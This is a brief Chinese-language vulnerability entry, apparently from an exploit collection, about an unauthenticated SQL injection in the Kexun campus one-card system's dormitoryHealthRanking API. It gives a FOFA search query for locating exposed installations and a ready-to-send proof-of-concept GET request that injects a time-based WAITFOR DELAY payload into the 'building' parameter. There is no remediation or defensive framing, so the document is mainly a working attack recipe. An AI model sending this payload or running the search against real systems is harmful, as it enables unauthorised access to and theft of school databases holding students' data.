# 科讯一卡通管理系统dormitoryHealthRanking存在SQL注入漏洞

科讯校园一卡通管理系统dormitoryHealthRanking存在SQL注入漏洞，未经身份验证的远程攻击者可以利用SQL注入漏洞获取数据库中的信息。

## fofa

```yaml
body="http://www.ahkxsoft.com/" && body="一卡通登录"
```

## poc

```yaml
GET /api/dormitoryHealthRanking?building=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

